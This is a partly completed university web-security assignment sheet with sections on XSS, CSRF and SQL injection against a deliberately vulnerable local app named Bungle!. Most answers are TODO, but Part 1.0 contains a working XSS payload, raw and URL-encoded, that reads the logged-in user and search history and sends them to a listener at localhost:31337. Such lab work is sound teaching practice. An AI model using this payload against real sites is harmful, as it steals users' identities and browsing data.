COSC 480B Assignment #3: Web Security

Due Date: 11/9/20 at 5:00pm ET

You may work with a partner on this assignment. 
Only one person partnership needs to submit.

Reminder: You may NOT work with the same partner on multiple assignments. 


NAMES: [Full Names of both partners]

________________________________________________________________________________________

Part 1: Cross-site Scripting (XSS)

	1.0) Payload (JavaScript/jQuery):
	<script>document.addEventListener("DOMContentLoaded", function(){var dest = "http://localhost:31337/stolen?user=" + document.getElementById("logged-in-user").innerText + "&last_search=" + document.getElementsByClassName("history-item list-group-item")[1].innerText; window.location.href=dest},false);</script>

	1.0) No defense

		http://0.0.0.0:8080/search?xssdefense=0&q=<script>document.addEventListener%28%22DOMContentLoaded%22%2C%20function%28%29%7Bvar%20dest%20%3D%20%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%20%2B%20document.getElementById%28%22logged-in-user%22%29.innerText%20%2B%20%22%26last_search%3D%22%20%2B%20document.getElementsByClassName%28%22history-item%20list-group-item%22%29%5B1%5D.innerText%3B%20window.location.href%3Ddest%7D%2Cfalse%29%3B%0A</script>


	1.1) Remove "script"

		http://0.0.0.0:8080/search?xssdefense=1&q=TODO


	1.2) Remove several tags 

		http://0.0.0.0:8080/search?xssdefense=2&q=TODO


	1.3) Remove " ' and ;

		http://0.0.0.0:8080/search?xssdefense=3&q=TODO


	1.4) [Optional extra credit] Encode < and >

		http://0.0.0.0:8080/search?xssdefense=4&q=TODO


________________________________________________________________________________________

Part 2: Cross-site Request Forgery (CSRF)

	2.0) No defense. Target URL: http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4

		<html>
			TODO
		</html>


	2.1) Token validation (with XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=1&xssdefense=0

		<html>
			TODO
		</html>


	2.2) [Optional extra credit] Token validation (without XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=&xssdefense=4

		<html>
			TODO
		</html>


________________________________________________________________________________________


Part 3: SQL Injection

	Username: TODO
	Password: TODO


________________________________________________________________________________________


Part 4: Better Defenses


	4.1) Briefly describe how you implemented password salting and hashing 

		TODO
		

	4.2) Briefly describe the changes you made to database.py to prevent SQL injection attacks

		TODO


	4.3) In 1-2 paragraphs, provide some advice to the Bunglers about how they should 
	     strengthen Bungle!'s defenses to prevent XSS attacks

		TODO


	4.4) In 1-2 paragraphs, provide some advice to the Bunglers about how they should 
	     strengthen Bungle!'s defenses to prevent CSRF attacks

	     	TODO


________________________________________________________________________________________


Additional Questions

	Q1 (ungraded). How did you divide the work between partners? (Put N/A if worked alone)

		[Your answer here]


	Q2 (optional, ungraded). Did you use code snippets from anywhere online that you need to cite?

		[Your answer here]


	Q3 (optional, ungraded). Do you have any suggestions for improving this assignment in the future?

		[Your answer here]